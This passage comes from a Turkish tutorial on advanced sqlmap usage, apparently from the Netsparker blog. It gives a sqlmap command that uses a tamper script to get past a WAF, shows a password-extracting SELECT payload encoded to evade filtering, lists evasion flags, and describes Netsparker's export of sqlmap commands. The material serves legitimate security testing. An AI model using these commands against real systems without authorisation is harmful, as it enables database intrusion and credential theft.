<p>Vereceğimiz olumlu cevap ile sqlmap, WAF/IPS/IDS’yi tespit etmeye çalışacak ve bulabildiği takdirde uygun tamper script’ini bize önerecektir. Manuel olarak daha ayrıntılı bir WAF testi yapmak için&nbsp;<code>--identify-waf</code>&nbsp;parametresinden yararlanabiliriz. Örneğin MySQL veri tabanını ve boşlukları validate eden bir WAF’ı kullanan bir uygulamayı taradığımızı düşünelim. Burada denememiz gereken MySQL’in boşluk satırı olarak kullandığı karakterleri kullanarak WAF’ı bypass etmeye çalışmak olacaktır. Şu tamper dosyası işimizi görecektir:</p>
<!-- /wp:paragraph -->

<!-- wp:table -->
<figure class="wp-block-table"><table><tbody><tr><td>1</td><td><code>sqlmap -u "<a href="http://example.com/main.php?id=test">http://example.com/main.php?id=test</a>" --tamper="space2mysqlblank.py"</code></td></tr></tbody></table></figure>
<!-- /wp:table -->

<!-- wp:paragraph -->
<p>Bunun neticesinde enjekte etmek istediğimiz payload (ör:&nbsp;<em>SELECT password FROM users</em>) şu hale geldi:&nbsp;<em>SELECT%0Bpassword%0BFROM%A0users</em></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Ayrıca birden fazla tamper dosyasını kullanmak için dosya isimlerinin arasına virgül koymak yeterli.</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2 id="genel-bazi-parametreler">Genel Bazı Parametreler</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Sqlmap, bünyesinde pek çok yararlı parametreyi barındırmaktadır. Buraya kadar bazı parametrelerin açıklamaları ve örneklerine değindik. Son olarak, yararlı olabileceğini düşündüğümüz birkaç parametreyi de ekleyelim.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>–batch:</strong>&nbsp;Bu parametre ile sqlmap’in sorduğu sorulara otomatik olarak varsayılan cevabı vermiş oluruz.<br><strong>–answer:</strong>&nbsp;<code>--answer="quit=N,follow=N"</code>&nbsp;gibi bir kullanımla söz konusu sorularla karşılaşıldığında otomatik olarak istediğimiz cevapların verilmesini istedik.<br><strong>–mobile:</strong>&nbsp;Mobil bir hedefe yaptığımız saldırı, hedef tarafından uygun User-Agent’ı bulundurmadığımız için engellenebilir. Bu parametreyle sqlmap testlerini bir mobil client gibi tanıtıyoruz.<br><strong>-v:</strong>&nbsp;Varsayılan değeri 1’dir. 0-6 arası değer verebiliriz. Bu parametre ile testler sırasında oluşan logları sqlmap ekranın görmemiz mümkün hale geliyor.<br><strong>-t:</strong>&nbsp;Tüm HTTP trafiğini ekrana yansıtmak yerine belirlediğimiz bir metin dosyasına aktarır.<br><strong>–force-ssl:</strong>&nbsp;HTTPS isteği yaparken bu parametreyi kullanabilirsiniz. Alternatif olarak Host adresinin sonuna 443 port numarası da eklenebilir.<br><strong>–version:</strong>&nbsp;Mevcut sqlmap sürümünü ekrana yansıtır.<br><strong>–update:</strong>&nbsp;Sqlmap’i otomatik olarak günceller. Windows sistemlerde çalışmamaktadır. Güncellemeyi manuel olarak yapmak gerekir.</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2 id="netsparker-in-sqlmap-destegi">Netsparker’ın Sqlmap Desteği</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Netsparker Desktop, bulunan SQL Injection zafiyetleri için sqlmap’te kullanabileceğiniz komutları hazır halde sunmaktadır. Netsparker, bulduğu SQL Injection zafiyetinin sqlmap’te tespiti için gerekli olan parametreleri otomatik olarak oluşturur. Bunun için zafiyetin üstüne sağ tıklayıp&nbsp;<strong>“Copy sqlmap Command”</strong>&nbsp;seçeneğine tıklamak yeterli.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://www.netsparker.com.tr/blog/web-guvenligi/ileri-seviye-sqlmap-kullanimi/#"><img src="https://d4qkvw08lssf8.cloudfront.net/statics/img/drive/Ileri-Seviye-Sqlmap-Kullanimi-07.png" alt="Copy sqlmap Command İle Komutları Kopyalamak" /></a></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Kopyalanan komutu sqlmap’te çalıştırabiliriz:</p>
<!-- /wp:paragraph -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://www.netsparker.com.tr/blog/web-guvenligi/ileri-seviye-sqlmap-kullanimi/#"><img src="https://d4qkvw08lssf8.cloudfront.net/statics/img/drive/Ileri-Seviye-Sqlmap-Kullanimi-08.png" alt="Kopyalanan Komutların Sqlmap'ta Çalıştırılması" /></a></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Netsparker, bulunan SQL Injection zafiyetinin testini sqlmap’te yapabilmeniz için gereken tüm parametreleri otomatik olarak ekler. Örneğin yukarıdaki örnekte -p parametresiyle vulnerable olan parametre,&nbsp;<code>--risk</code>&nbsp;parametresiyle denenecek payloadların seviyesi,&nbsp;<code>--user-agent</code>&nbsp;bilgisi,&nbsp;<code>--headers</code>&nbsp;parametresiyle Netsparker’ın tarama sırasında kullandığı header bilgisi ve son olarak&nbsp;<code>--dbms</code>&nbsp;parametresiyle uygun DBMS bilgisi otomatik olarak oluşturuldu.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>Saygılarımla. – Best regards.</strong></p>
<!-- /wp:paragraph -->
